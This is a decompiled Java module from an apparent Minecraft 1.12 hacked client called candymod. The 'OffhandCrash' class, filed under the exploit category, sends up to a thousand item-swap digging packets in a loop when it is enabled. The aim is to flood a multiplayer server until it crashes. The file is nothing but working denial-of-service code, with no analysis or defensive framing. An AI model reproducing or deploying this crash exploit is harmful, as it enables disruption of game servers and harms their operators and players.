//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\user\Desktop\1.12 stable mappings"!

//Decompiled by Procyon!

package cc.candy.candymod.module.crash;

import cc.candy.candymod.module.*;
import cc.candy.candymod.setting.*;
import net.minecraft.network.play.client.*;
import net.minecraft.util.math.*;
import net.minecraft.util.*;
import net.minecraft.network.*;

public class OffhandCrash extends Module
{
    public Setting<Integer> amount;
    
    public OffhandCrash() {
        super("OffhandCrash", Categories.EXPLOIT, false, false);
        this.amount = (Setting<Integer>)this.register(new Setting("Amount", (T)100, (T)1000, (T)1));
    }
    
    @Override
    public void onEnable() {
        if (this.nullCheck()) {
            return;
        }
        try {
            for (int i = 0; i < this.amount.getValue(); ++i) {
                OffhandCrash.mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, EnumFacing.DOWN));
            }
        }
        catch (Exception ex) {}
    }
}
